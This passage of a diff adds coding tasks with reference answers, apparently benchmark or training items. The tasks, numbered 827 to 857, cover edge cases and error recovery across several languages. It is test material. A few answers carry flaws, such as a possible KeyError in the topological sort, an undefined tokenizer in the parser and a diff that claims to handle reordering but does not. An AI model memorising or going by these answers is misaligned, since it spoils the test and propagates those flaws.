+      "answer": "Timestamps representing the same instant but with different offsets (e.g., `2024-01-15T10:00:00+05:00` and `2024-01-15T05:00:00Z`) must be sorted by their UTC equivalent:\n\n```python\nfrom datetime import datetime\n\ndef sort_timestamps(ts_list: list[str]) -> list[str]:\n    def to_utc_key(s):\n        dt = datetime.fromisoformat(s.replace('Z', '+00:00'))\n        return dt.utctimetuple(), dt.microsecond  # sort by UTC instant\n    return sorted(ts_list, key=lambda s: datetime.fromisoformat(\n        s.replace('Z', '+00:00')\n    ).timestamp())\n\ntimestamps = [\n    '2024-01-15T10:00:00+05:00',   # UTC 05:00\n    '2024-01-15T05:00:00Z',         # UTC 05:00 (same instant)\n    '2024-01-15T06:00:00+00:00',    # UTC 06:00 (later)\n]\nresult = sort_timestamps(timestamps)\n# First two are equal (same UTC); third is later\n# Stable sort preserves order of equal elements\n```\nNever sort by the string representation or local-time part — `'10:00+05:00'` appears later than `'05:00Z'` lexicographically but represents the same instant.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Sort timestamps that represent the same instant but use different offsets. They must compare as equal in sort order."
+    },
+    "828": {
+      "id": 828,
+      "answer": "Interval overlap detection where endpoints may be inclusive `[a,b]` or exclusive `(a,b)`:\n\n```python\nfrom dataclasses import dataclass\nfrom typing import Any\n\n@dataclass\nclass Interval:\n    start: Any\n    end: Any\n    start_inclusive: bool = True\n    end_inclusive: bool = True\n\ndef overlaps(a: Interval, b: Interval) -> bool:\n    # a ends before b starts?\n    if a.end < b.start: return False\n    if a.end == b.start:\n        return a.end_inclusive and b.start_inclusive\n    # b ends before a starts?\n    if b.end < a.start: return False\n    if b.end == a.start:\n        return b.end_inclusive and a.start_inclusive\n    return True\n\nassert overlaps(Interval(1,3), Interval(3,5)) == True   # [1,3] ∩ [3,5] = {3}\nassert overlaps(Interval(1,3,True,False), Interval(3,5)) == False  # (1,3) ∩ [3,5] = empty\nassert overlaps(Interval(1,2), Interval(3,4)) == False  # no overlap\nassert overlaps(Interval(1,5), Interval(2,3)) == True   # contained\n```\nThe edge case is touching endpoints: `[1,3]` and `[3,5]` overlap at 3, but `(1,3)` and `[3,5]` do not.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement interval overlap detection for time ranges where endpoints may be inclusive or exclusive."
+    },
+    "829": {
+      "id": 829,
+      "answer": "Pagination must handle: empty dataset, page_size=0 (division by zero guard), negative page numbers, and total count not a multiple of page size:\n\n```python\nfrom math import ceil\n\ndef paginate(total: int, page: int, page_size: int) -> dict:\n    if page_size <= 0:\n        raise ValueError(f'page_size must be > 0, got {page_size}')\n    if total < 0:\n        raise ValueError(f'total must be >= 0, got {total}')\n    total_pages = ceil(total / page_size) if total > 0 else 1\n    # Clamp page to valid range [1, total_pages]\n    page = max(1, min(page, total_pages))\n    offset = (page - 1) * page_size\n    limit = min(page_size, total - offset)\n    return {\n        'page': page,\n        'page_size': page_size,\n        'total': total,\n        'total_pages': total_pages,\n        'offset': offset,\n        'limit': max(0, limit),\n        'has_next': page < total_pages,\n        'has_prev': page > 1,\n    }\n\nassert paginate(0, 1, 10)['limit'] == 0\nassert paginate(0, 1, 10)['total_pages'] == 1\nassert paginate(11, 2, 5)['limit'] == 1  # last page has 1 item\nassert paginate(10, -1, 5)['page'] == 1  # clamped\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a pagination function that handles empty datasets, page size 0, negative page numbers, and total count not a multiple of page size."
+    },
+    "830": {
+      "id": 830,
+      "answer": "Binary search for first/last occurrence in an array that may contain duplicates, null, and NaN (which break comparisons):\n\n```js\nfunction binarySearchFirst(arr, target) {\n  // NaN: target is NaN -> NaN !== NaN so always returns -1 by spec\n  // null/undefined: compare as usual with strict equality\n  let lo = 0, hi = arr.length - 1, result = -1;\n  while (lo <= hi) {\n    const mid = (lo + hi) >>> 1;\n    if (arr[mid] === target) {\n      result = mid;\n      hi = mid - 1;  // keep searching left for first occurrence\n    } else if (arr[mid] < target || arr[mid] !== arr[mid]) {\n      // arr[mid] !== arr[mid] handles NaN (NaN < target is false but NaN is not target)\n      lo = mid + 1;\n    } else {\n      hi = mid - 1;\n    }\n  }\n  return result;\n}\n// [1,2,2,3,null,null] sorted: nulls compare as 0\n// NaN in sorted array breaks binary search — document that NaN must be excluded\n// binarySearchFirst([1,2,2,3], 2) === 1  (first index)\n```\nNaN cannot be found by binary search (`NaN < x` and `NaN > x` are both false); document that NaN elements must be filtered before sorting.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement binary search over a sorted array that may contain duplicates, null, NaN. Return the first occurrence index."
+    },
+    "831": {
+      "id": 831,
+      "answer": "IPv6 validation must handle: compressed notation (::), IPv4-mapped forms (::ffff:192.168.1.1), uppercase hex, leading zeros in groups, and invalid forms:\n\n```python\nimport ipaddress\n\ndef validate_ipv6(s: str) -> dict:\n    s = s.strip()\n    try:\n        addr = ipaddress.IPv6Address(s)\n        return {\n            'valid': True,\n            'expanded': addr.exploded,\n            'compressed': addr.compressed,\n            'is_ipv4_mapped': addr.ipv4_mapped is not None,\n            'is_loopback': addr.is_loopback,\n        }\n    except ipaddress.AddressValueError as e:\n        return {'valid': False, 'error': str(e)}\n\n# Valid cases:\n# '::1' -> loopback, valid\n# '::ffff:192.168.1.1' -> IPv4-mapped, valid\n# '2001:0DB8::0001' -> uppercase, leading zeros -> valid (normalizes)\n# ':::1' -> invalid (triple colon)\n# '2001:db8::1::1' -> invalid (two :: compressions)\n# 'gggg::1' -> invalid (non-hex)\n```\nThe `ipaddress` stdlib handles all edge cases correctly. Do not write your own IPv6 regex — the format has too many valid permutations.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Parse and validate IPv6 addresses including compression, IPv4-mapped forms, uppercase hex, and invalid inputs."
+    },
+    "832": {
+      "id": 832,
+      "answer": "LRU cache with capacity 0 and 1 as edge cases:\n\n```python\nfrom collections import OrderedDict\n\nclass LRUCache:\n    def __init__(self, capacity: int):\n        if capacity < 0:\n            raise ValueError('capacity must be >= 0')\n        self.capacity = capacity\n        self._cache = OrderedDict()\n\n    def get(self, key):\n        if key not in self._cache:\n            return -1\n        self._cache.move_to_end(key)\n        return self._cache[key]\n\n    def put(self, key, value):\n        if self.capacity == 0:\n            return  # capacity 0: never store anything\n        if key in self._cache:\n            self._cache.move_to_end(key)\n        self._cache[key] = value\n        if len(self._cache) > self.capacity:\n            self._cache.popitem(last=False)  # evict LRU\n\n# Capacity 0: put does nothing, get always returns -1\ncache0 = LRUCache(0)\ncache0.put('a', 1)\nassert cache0.get('a') == -1\n\n# Capacity 1: second put evicts first\ncache1 = LRUCache(1)\ncache1.put('a', 1)\ncache1.put('b', 2)  # evicts 'a'\nassert cache1.get('a') == -1\nassert cache1.get('b') == 2\n\n# Same key update: should NOT evict (just moves to end)\ncache1.put('b', 99)\nassert cache1.get('b') == 99\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Build an LRU cache with capacity 0 and 1 as edge cases. Verify behavior when inserting the same key multiple times."
+    },
+    "833": {
+      "id": 833,
+      "answer": "Topological sort with self-loops, disconnected components, and cycle detection using Kahn's algorithm:\n\n```python\nfrom collections import defaultdict, deque\n\ndef topological_sort(nodes: list, edges: list[tuple]) -> list:\n    \"\"\"Returns sorted list or raises ValueError on cycle (including self-loops).\"\"\"\n    in_degree = {n: 0 for n in nodes}\n    adj = defaultdict(list)\n    for u, v in edges:\n        if u == v:\n            raise ValueError(f'Self-loop detected at node {u!r}')\n        adj[u].append(v)\n        in_degree[v] += 1\n        if v not in in_degree:\n            in_degree[v] = 0  # ensure all nodes present\n\n    queue = deque(n for n in nodes if in_degree[n] == 0)\n    result = []\n    while queue:\n        node = queue.popleft()\n        result.append(node)\n        for neighbor in adj[node]:\n            in_degree[neighbor] -= 1\n            if in_degree[neighbor] == 0:\n                queue.append(neighbor)\n\n    if len(result) != len(nodes):\n        cycle_nodes = [n for n in nodes if in_degree[n] > 0]\n        raise ValueError(f'Cycle detected involving nodes: {cycle_nodes}')\n    return result\n\n# Disconnected nodes with in_degree 0 are added to queue at initialization\n# so disconnected components are naturally handled\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement topological sort for a dependency graph that may contain self-loops, disconnected components, and cycles."
+    },
+    "834": {
+      "id": 834,
+      "answer": "Deduplicate objects by deep content, not reference, handling key-order variance:\n\n```python\nimport json\n\ndef deep_dedup(items: list) -> list:\n    seen = set()\n    result = []\n    for item in items:\n        # Canonical JSON: sort keys recursively for stable representation\n        key = json.dumps(item, sort_keys=True, default=str)\n        if key not in seen:\n            seen.add(key)\n            result.append(item)\n    return result\n\n# {\"a\":1,\"b\":2} and {\"b\":2,\"a\":1} produce same canonical key\nassert len(deep_dedup([{'a':1,'b':2}, {'b':2,'a':1}, {'a':1,'b':3}])) == 2\n```\nFor JavaScript:\n```js\nfunction deepDedup(arr) {\n  const seen = new Set();\n  return arr.filter(item => {\n    const key = JSON.stringify(item, Object.keys(item).sort());\n    if (seen.has(key)) return false;\n    seen.add(key);\n    return true;\n  });\n}\n```\nCaveats: JSON.stringify cannot handle circular references, Map/Set values, or undefined properties. For those cases, use a recursive canonical serializer.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Deduplicate a list of objects by deep content, not reference identity. Inputs may differ only by key order."
+    },
+    "835": {
+      "id": 835,
+      "answer": "Email validation for a system allowing Unicode local parts but forbidding control characters, empty parts, and overly long addresses:\n\n```python\nimport re, unicodedata\n\nMAX_LOCAL = 64\nMAX_DOMAIN = 255\nMAX_TOTAL = 320\nCONTROL_RE = re.compile(r'[\\x00-\\x1f\\x7f]')\n\ndef validate_email(s: str) -> bool:\n    if not s or len(s) > MAX_TOTAL:\n        return False\n    # Split on last '@' (local part may contain '@' in quoted strings per RFC but we simplify)\n    at = s.rfind('@')\n    if at < 1:  # no '@' or empty local part\n        return False\n    local, domain = s[:at], s[at+1:]\n    if not local or not domain:\n        return False\n    if len(local) > MAX_LOCAL or len(domain) > MAX_DOMAIN:\n        return False\n    if CONTROL_RE.search(local) or CONTROL_RE.search(domain):\n        return False\n    # Reject bidirectional control chars (bidi override attacks)\n    for ch in local + domain:\n        cat = unicodedata.category(ch)\n        if cat in ('Cc', 'Cf'):  # control or format chars\n            return False\n    # Basic domain structure check\n    if not re.match(r'^[^.][^\\s]*\\.[a-zA-Z]{2,}$', domain):\n        return False\n    return True\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Validate email-like input for a system that allows Unicode local parts but forbids control characters, empty parts, and overly long addresses."
+    },
+    "836": {
+      "id": 836,
+      "answer": "Rate limiter keyed by user ID where IDs may be empty, Unicode variants, or extremely long:\n\n```python\nimport time, hashlib, unicodedata\nfrom collections import defaultdict\n\nclass RateLimiter:\n    def __init__(self, max_requests: int, window_seconds: float):\n        self.max_requests = max_requests\n        self.window = window_seconds\n        self._buckets: dict[str, list[float]] = defaultdict(list)\n\n    def _normalize_id(self, user_id: str) -> str:\n        if not isinstance(user_id, str):\n            raise TypeError('user_id must be a string')\n        # Normalize Unicode to prevent variant bypass\n        normalized = unicodedata.normalize('NFKC', user_id).strip()\n        # Empty string after normalization -> use sentinel key\n        if not normalized:\n            normalized = '__empty__'\n        # Extremely long IDs: hash to prevent memory DoS\n        if len(normalized) > 256:\n            normalized = 'long:' + hashlib.sha256(normalized.encode()).hexdigest()\n        return normalized\n\n    def is_allowed(self, user_id: str) -> bool:\n        key = self._normalize_id(user_id)\n        now = time.monotonic()\n        window_start = now - self.window\n        # Prune expired entries\n        self._buckets[key] = [t for t in self._buckets[key] if t > window_start]\n        if len(self._buckets[key]) >= self.max_requests:\n            return False\n        self._buckets[key].append(now)\n        return True\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement a rate limiter keyed by user ID where IDs may be empty strings, Unicode variants, or extremely long."
+    },
+    "837": {
+      "id": 837,
+      "answer": "Serialize nested form data to URL-encoded query string, handling arrays, empty strings, null, and special characters:\n\n```python\nfrom urllib.parse import urlencode, quote_plus\n\ndef to_query_string(data: dict, prefix: str = '') -> str:\n    pairs = []\n    for key, value in data.items():\n        full_key = f'{prefix}[{key}]' if prefix else key\n        if isinstance(value, dict):\n            pairs.append(to_query_string(value, full_key))\n        elif isinstance(value, list):\n            for i, item in enumerate(value):\n                arr_key = f'{full_key}[{i}]'\n                if isinstance(item, dict):\n                    pairs.append(to_query_string(item, arr_key))\n                elif item is None:\n                    pairs.append(f'{quote_plus(arr_key)}=')\n                else:\n                    pairs.append(f'{quote_plus(arr_key)}={quote_plus(str(item))}')\n        elif value is None:\n            pairs.append(f'{quote_plus(full_key)}=')\n        else:\n            pairs.append(f'{quote_plus(full_key)}={quote_plus(str(value))}')\n    return '&'.join(filter(None, pairs))\n\n# to_query_string({'a': [1, 2], 'b': '', 'c': None, 'd': {'e': 'f&g'}})\n# -> 'a[0]=1&a[1]=2&b=&c=&d[e]=f%26g'\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a serializer for nested form data to URL-encoded query strings. Handle arrays, empty strings, null, and special characters."
+    },
+    "838": {
+      "id": 838,
+      "answer": "Parse deeply nested parentheses without recursion by using an explicit stack:\n\n```python\ndef parse_expr(expr: str):\n    \"\"\"Returns AST or value. Uses iterative approach to avoid stack overflow.\"\"\"\n    # Tokenize\n    tokens = tokenize(expr)  # produces NUMBER, PLUS, MINUS, LPAREN, RPAREN tokens\n    # Operator-precedence parsing using two stacks (shunting-yard)\n    output = []   # operand stack\n    ops = []      # operator stack\n    PREC = {'+': 1, '-': 1, '*': 2, '/': 2}\n\n    for tok in tokens:\n        if tok.type == 'NUMBER':\n            output.append(float(tok.value))\n        elif tok.type == 'OP':\n            while ops and ops[-1] != '(' and PREC.get(ops[-1], 0) >= PREC[tok.value]:\n                apply_op(output, ops.pop())\n            ops.append(tok.value)\n        elif tok.type == 'LPAREN':\n            ops.append('(')\n        elif tok.type == 'RPAREN':\n            while ops and ops[-1] != '(':\n                apply_op(output, ops.pop())\n            if not ops:\n                raise ValueError('Mismatched parentheses')\n            ops.pop()  # remove '('\n    while ops:\n        if ops[-1] == '(':\n            raise ValueError('Mismatched parentheses')\n        apply_op(output, ops.pop())\n    return output[0] if output else None\n\ndef apply_op(output, op):\n    b, a = output.pop(), output.pop()\n    output.append({'+':a+b,'-':a-b,'*':a*b,'/':a/b}[op])\n```\nThe shunting-yard algorithm is iterative and handles depth 50,000 without recursion.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Parse arithmetic expressions with deeply nested parentheses up to depth 50,000 without recursion overflow."
+    },
+    "839": {
+      "id": 839,
+      "answer": "A stable hash of JSON-like data where object key order does not matter but array order does. Approach: recursively sort object keys before hashing:\n\n```python\nimport json, hashlib\n\ndef canonical_json(value) -> str:\n    if isinstance(value, dict):\n        # Sort keys for order-independence\n        return '{' + ','.join(\n            f'{json.dumps(k)}:{canonical_json(value[k])}'\n            for k in sorted(value.keys())\n        ) + '}'\n    elif isinstance(value, list):\n        # Preserve array order\n        return '[' + ','.join(canonical_json(v) for v in value) + ']'\n    else:\n        return json.dumps(value)  # handles str, int, float, bool, None\n\ndef stable_hash(value, algorithm='sha256') -> str:\n    canon = canonical_json(value)\n    h = hashlib.new(algorithm)\n    h.update(canon.encode('utf-8'))\n    return h.hexdigest()\n\nassert stable_hash({'b':1,'a':2}) == stable_hash({'a':2,'b':1})  # key order irrelevant\nassert stable_hash([1,2,3]) != stable_hash([3,2,1])              # array order matters\nassert stable_hash({'a':[1,2]}) != stable_hash({'a':[2,1]})      # nested array order matters\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement a stable hash of arbitrary JSON-like data where object key order does not matter, but array order does."
+    },
+    "840": {
+      "id": 840,
+      "answer": "JSON diff function reporting changes at precise paths, handling additions, deletions, type changes, and array reordering:\n\n```python\ndef json_diff(old, new, path='') -> list[dict]:\n    diffs = []\n    if type(old) != type(new):\n        diffs.append({'path': path or '/', 'type': 'type_change',\n                      'old': old, 'new': new})\n        return diffs\n    if isinstance(old, dict):\n        all_keys = set(old) | set(new)\n        for k in sorted(all_keys):\n            child_path = f'{path}.{k}' if path else k\n            if k not in old:\n                diffs.append({'path': child_path, 'type': 'added', 'value': new[k]})\n            elif k not in new:\n                diffs.append({'path': child_path, 'type': 'removed', 'value': old[k]})\n            else:\n                diffs.extend(json_diff(old[k], new[k], child_path))\n    elif isinstance(old, list):\n        # Report by index; length change is also captured\n        for i in range(max(len(old), len(new))):\n            child_path = f'{path}[{i}]'\n            if i >= len(old):\n                diffs.append({'path': child_path, 'type': 'added', 'value': new[i]})\n            elif i >= len(new):\n                diffs.append({'path': child_path, 'type': 'removed', 'value': old[i]})\n            else:\n                diffs.extend(json_diff(old[i], new[i], child_path))\n    else:\n        if old != new:\n            diffs.append({'path': path or '/', 'type': 'changed', 'old': old, 'new': new})\n    return diffs\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a diff function for two JSON-like values that reports changes at precise paths. Handle additions, deletions, type changes, and array reordering."
+    },
+    "841": {
+      "id": 841,
+      "answer": "import requests\nfrom requests.exceptions import Timeout, RequestException\n\ndef fetch_url(url: str) -> dict | None:\n    try:\n        response = requests.get(url, timeout=2)\n        response.raise_for_status()\n        return response.json()\n    except Timeout:\n        print(f'Request timed out after 2 seconds: {url}')\n        return None\n    except RequestException as e:\n        print(f'Request failed: {e}')\n        return None\n\nKey points: timeout=2 is passed to requests.get (both connect and read timeout); Timeout is caught separately for clarity; raise_for_status() catches 4xx/5xx HTTP errors; returning None on failure rather than raising allows callers to handle gracefully.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that calls a URL/API with a 2-second timeout using requests. If the request times out, return None and log the error."
+    },
+    "842": {
+      "id": 842,
+      "answer": "const fs = require('fs/promises');\n\nasync function readJsonFile(filePath) {\n  try {\n    const text = await fs.readFile(filePath, 'utf-8');\n    return JSON.parse(text);\n  } catch (err) {\n    if (err.code === 'ENOENT') {\n      console.warn(`File not found: ${filePath}`);\n      return null;\n    }\n    if (err instanceof SyntaxError) {\n      console.error(`Invalid JSON in ${filePath}: ${err.message}`);\n      return null;\n    }\n    throw err; // re-throw unexpected errors\n  }\n}\n\nDistinguishes ENOENT (missing file) from SyntaxError (bad JSON) from unexpected errors (re-thrown). Returns null for known failure modes.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Node.js async function that reads a JSON file using fs/promises. If the file does not exist, return null and log a warning."
+    },
+    "843": {
+      "id": 843,
+      "answer": "func ReadTextFile(path string) (string, error) {\n    data, err := os.ReadFile(path)\n    if err != nil {\n        if errors.Is(err, os.ErrNotExist) {\n            return \"default\", nil // file missing: return default, no error\n        }\n        return \"\", fmt.Errorf(\"reading file %s: %w\", path, err)\n    }\n    return string(data), nil\n}\n\nKey points: errors.Is(err, os.ErrNotExist) checks for missing file specifically; returning (\"default\", nil) signals the caller that the default was used without an error; other errors are wrapped with context and returned as real errors so callers can log or handle them.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Go function that reads a text file. If the file is missing, return the default string and no error."
+    },
+    "844": {
+      "id": 844,
+      "answer": "public static int parsePort(String input) throws IllegalArgumentException {\n    if (input == null || input.isBlank()) {\n        throw new IllegalArgumentException(\"Port string is null or blank\");\n    }\n    int port;\n    try {\n        port = Integer.parseInt(input.strip());\n    } catch (NumberFormatException e) {\n        throw new IllegalArgumentException(\"Not a valid integer: \" + input, e);\n    }\n    if (port < 1 || port > 65535) {\n        throw new IllegalArgumentException(\"Port out of range [1-65535]: \" + port);\n    }\n    return port;\n}\n\nHandles: null input, blank input, non-numeric strings (NumberFormatException), out-of-range values. Strips whitespace before parsing.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Java method that converts a string to an integer port number. If the input is not a valid integer in [1-65535], throw a descriptive exception."
+    },
+    "845": {
+      "id": 845,
+      "answer": "import os\n\nDEFAULT_VALUE = 'localhost'\n\ndef get_env_var(name: str, default: str = DEFAULT_VALUE) -> str:\n    value = os.environ.get(name)\n    if not value:  # covers None (unset) and '' (empty)\n        return default\n    return value\n\nNote: os.environ.get returns None if unset, '' if set to empty. Using 'not value' catches both. If empty string should be treated differently from unset, use: value = os.environ.get(name, None); if value is None: ... elif value == '': .... Always document which behavior is intended — treating empty as unset is a common source of subtle bugs.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that reads an environment variable. If the variable is unset or empty, return a default value."
+    },
+    "846": {
+      "id": 846,
+      "answer": "interface Config { host: string; port: number; }\n\nfunction parseConfig(input: unknown): Config {\n  if (typeof input !== 'object' || input === null) {\n    throw new TypeError('Config must be a non-null object');\n  }\n  const obj = input as Record<string, unknown>;\n  if (typeof obj.host !== 'string' || obj.host === '') {\n    throw new TypeError('Missing or invalid required property: host (string)');\n  }\n  if (typeof obj.port !== 'number' || !Number.isInteger(obj.port)) {\n    throw new TypeError('Missing or invalid required property: port (integer)');\n  }\n  return { host: obj.host, port: obj.port };\n}\n\nEach missing/wrong-type property produces a descriptive error naming the property and expected type. Does not use TypeScript type assertions that bypass runtime checks.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a TypeScript function that expects an object of a specific shape. If a required property is missing or has the wrong type, throw a descriptive error."
+    },
+    "847": {
+      "id": 847,
+      "answer": "#[derive(Deserialize)]\nstruct Person { name: String, age: u32 }\n\nfn parse_person(json_str: &str) -> Result<Person, String> {\n    if json_str.trim().is_empty() {\n        return Err(\"Input JSON string is empty\".to_string());\n    }\n    serde_json::from_str::<Person>(json_str)\n        .map_err(|e| format!(\"Failed to parse Person from JSON: {}\", e))\n}\n\nReturns Ok(Person) on success, Err with a human-readable message on invalid JSON or missing/wrong-typed fields. The empty-check before parsing provides a clearer error message than serde's 'EOF while parsing' message. Use ? operator in callers to propagate the error.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Rust function that parses JSON from a string into a struct with name and age fields. If JSON is invalid or fields are missing, return a descriptive error."
+    },
+    "848": {
+      "id": 848,
+      "answer": "public static List<string> ReadLines(string filePath)\n{\n    try\n    {\n        return File.ReadAllLines(filePath).ToList();\n    }\n    catch (UnauthorizedAccessException ex)\n    {\n        Console.Error.WriteLine($\"Permission denied reading {filePath}: {ex.Message}\");\n        return new List<string>();\n    }\n    catch (FileNotFoundException)\n    {\n        Console.Error.WriteLine($\"File not found: {filePath}\");\n        return new List<string>();\n    }\n    catch (IOException ex)\n    {\n        Console.Error.WriteLine($\"IO error reading {filePath}: {ex.Message}\");\n        return new List<string>();\n    }\n}\n\nReturns empty list (never null) on any file error. Catches permission errors specifically for clarity.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a C# method that returns a list of strings from a file. If the file cannot be opened due to permissions or missing file, return an empty list and log the error."
+    },
+    "849": {
+      "id": 849,
+      "answer": "import requests\nfrom requests.exceptions import RequestException\n\ndef download_file(url: str, dest_path: str) -> bool:\n    try:\n        response = requests.get(url, timeout=30, stream=True)\n        if response.status_code >= 500:\n            print(f'Server error {response.status_code} downloading {url}')\n            return False\n        response.raise_for_status()  # handles 4xx\n        with open(dest_path, 'wb') as f:\n            for chunk in response.iter_content(chunk_size=8192):\n                f.write(chunk)\n        return True\n    except RequestException as e:\n        print(f'Download failed: {e}')\n        return False\n\nChecks status >= 500 before raise_for_status to distinguish server errors from client errors. Uses streaming to handle large files without loading entirely into memory.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that downloads a file with requests. If the HTTP response is 500 or higher, log and return False."
+    },
+    "850": {
+      "id": 850,
+      "answer": "function parseJsonArray(input) {\n  if (input === null || input === undefined) return [];\n  if (Array.isArray(input)) return input;\n  if (typeof input !== 'string') return [];\n  try {\n    const parsed = JSON.parse(input);\n    return Array.isArray(parsed) ? parsed : [];\n  } catch {\n    return [];\n  }\n}\n\nHandles: null/undefined input → []; already-an-array input → return as-is; non-string non-array input → []; invalid JSON string → []; valid JSON that is not an array (e.g. an object) → []. Never throws. The type guard Array.isArray after parsing ensures callers always receive an array.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a JavaScript function that returns an array. If the input is invalid JSON, return an empty array."
+    },
+    "851": {
+      "id": 851,
+      "answer": "fun extractBearerToken(request: HttpServletRequest): String? {\n    val header = request.getHeader(\"Authorization\") ?: return null\n    if (header.isBlank()) return null\n    if (!header.startsWith(\"Bearer \", ignoreCase = true)) return null\n    val token = header.substring(7).trim()\n    return if (token.isEmpty()) null else token\n}\n\nReturns null for: absent header, blank header, header without 'Bearer ' prefix, and 'Bearer ' with empty token after trimming. Callers should treat null as unauthenticated. The ignoreCase handles 'bearer token' and 'BEARER token' variants. Never throw on missing auth header — let the authorization layer decide the response code.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Kotlin function that reads the Authorization header. If the header is absent, blank, or contains no token after 'Bearer ', return null."
+    },
+    "852": {
+      "id": 852,
+      "answer": "import psycopg2\nfrom psycopg2 import OperationalError\n\ndef get_db_connection(dsn: str):\n    try:\n        conn = psycopg2.connect(dsn, connect_timeout=5)\n        return conn\n    except OperationalError as e:\n        msg = str(e).lower()\n        if 'authentication' in msg or 'password' in msg:\n            raise PermissionError(f'Database authentication failed: {e}') from e\n        raise ConnectionError(f'Database connection failed: {e}') from e\n\nDistinguishes authentication failures (wrong credentials) from other connection failures (host unreachable, port closed). Re-raises as standard Python exception types so callers can catch PermissionError specifically. Always set a connect_timeout to avoid hanging indefinitely.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function using a database client library. If the connection fails with an authentication error, raise a PermissionError."
+    },
+    "853": {
+      "id": 853,
+      "answer": "<?php\nfunction readCsvFile(string $path): array {\n    if (!file_exists($path)) {\n        error_log(\"CSV file not found: $path\");\n        return [];\n    }\n    $handle = @fopen($path, 'r');\n    if ($handle === false) {\n        error_log(\"Cannot open CSV file: $path\");\n        return [];\n    }\n    $rows = [];\n    while (($row = fgetcsv($handle)) !== false) {\n        $rows[] = $row;\n    }\n    fclose($handle);\n    return $rows;\n}\n?>\n\nReturns empty array (never null) if file is missing or unreadable. Uses @ to suppress fopen warnings (errors logged separately). fgetcsv handles RFC 4180 quoting automatically.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a PHP function that opens a CSV file and returns all rows. If the file is missing, return an empty array."
+    },
+    "854": {
+      "id": 854,
+      "answer": "require 'date'\n\ndef parse_date(str)\n  return nil if str.nil? || str.strip.empty?\n  begin\n    Date.strptime(str.strip, '%Y-%m-%d')\n  rescue Date::Error\n    nil\n  end\nend\n\nDate::Error (ArgumentError in older Ruby) is raised for both format mismatches ('2024/03/15') and impossible dates ('2024-02-30', '2024-13-01'). Returns nil for all invalid inputs rather than raising — callers check for nil. strptime is strict about the format unlike Date.parse which accepts many formats and can parse unexpected inputs.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Ruby method that parses dates in YYYY-MM-DD format. If the input is invalid or impossible, return nil."
+    },
+    "855": {
+      "id": 855,
+      "answer": "async function fetchJson<T>(url: string): Promise<T | null> {\n  try {\n    const response = await fetch(url, { signal: AbortSignal.timeout(10000) });\n    if (!response.ok) {\n      console.error(`HTTP error ${response.status} fetching ${url}`);\n      return null;\n    }\n    const text = await response.text();\n    try {\n      return JSON.parse(text) as T;\n    } catch {\n      console.error(`Invalid JSON from ${url}`);\n      return null;\n    }\n  } catch (err) {\n    console.error(`Network error fetching ${url}:`, err);\n    return null;\n  }\n}\n\nHandles: network failure, HTTP error status, invalid JSON body. Returns null on all failure paths. Uses AbortSignal.timeout for request timeout.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a TypeScript async function that fetches JSON from a URL. If the network request fails or the response is not valid JSON, return null."
+    },
+    "856": {
+      "id": 856,
+      "answer": "func OpenLogFile(path string) (*os.File, error) {\n    dir := filepath.Dir(path)\n    if err := os.MkdirAll(dir, 0755); err != nil {\n        return nil, fmt.Errorf(\"creating log directory %s: %w\", dir, err)\n    }\n    f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)\n    if err != nil {\n        return nil, fmt.Errorf(\"opening log file %s: %w\", path, err)\n    }\n    return f, nil\n}\n\nMkdirAll creates the full directory tree if missing (no-op if it already exists). O_APPEND|O_CREATE|O_WRONLY opens for appending, creating the file if it doesn't exist. Errors include the path for debuggability.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Go function that opens a log file for appending. If the parent directory does not exist, create it first."
+    },
+    "857": {
+      "id": 857,
+      "answer": "def read_number_from_stdin(prompt: str = 'Enter a number: ') -> float:\n    while True:\n        try:\n            raw = input(prompt)\n            return float(raw)\n        except ValueError:\n            print(f'Invalid input {raw!r}: please enter a numeric value.')\n        except EOFError:\n            raise SystemExit('No more input available.')\n\nLoops until valid numeric input is received. ValueError is raised by float() on non-numeric strings. EOFError is raised when stdin is closed (e.g. piped input exhausted) — exit cleanly rather than looping forever. The prompt is re-displayed each iteration so the user knows input is expected again.",
+      "tier": "T4",
+      "category": "error_recovery",
+      "task": "Write a Python function that reads from standard input. If the user enters non-numeric text, prompt again."
+    },
+    "858": {
+      "id": 858,
